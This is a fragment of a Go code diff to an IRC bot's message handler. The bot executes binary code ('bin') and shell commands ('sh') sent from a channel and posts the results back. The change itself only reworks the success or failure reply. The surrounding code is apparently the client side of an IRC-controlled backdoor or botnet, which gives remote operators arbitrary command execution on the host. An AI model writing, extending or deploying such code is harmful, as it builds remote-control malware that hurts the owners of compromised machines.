@@ -15,16 +15,20 @@ func handler(c *irc.Client, m *irc.Message) {
 		transfer()
 	// byte code execution
 	case m.Command == "PRIVMSG" && c.FromChannel(m) && readCommand(m.Params[1]) == "bin":
+		var ok string
 		if binaryExecute(m.Params[1]) {
-			c.WriteMessage(&irc.Message{
+			ok = "[OK]" // if executed code didnt return error
+		} else {
+			ok = "[!OK]" // opposite
+		}
+
+		c.WriteMessage(&irc.Message{
 			Command: "PRIVMSG",
 			Params: []string{
 				m.Params[0],
-				"[OK]",
-				},
-			})
-
-		}
+				ok,
+			},
+		})
 	// pass every message from channel to executeCommand / return its output
 	case m.Command == "PRIVMSG" && c.FromChannel(m) && readCommand(m.Params[1]) == "sh":
 		c.WriteMessage(&irc.Message{
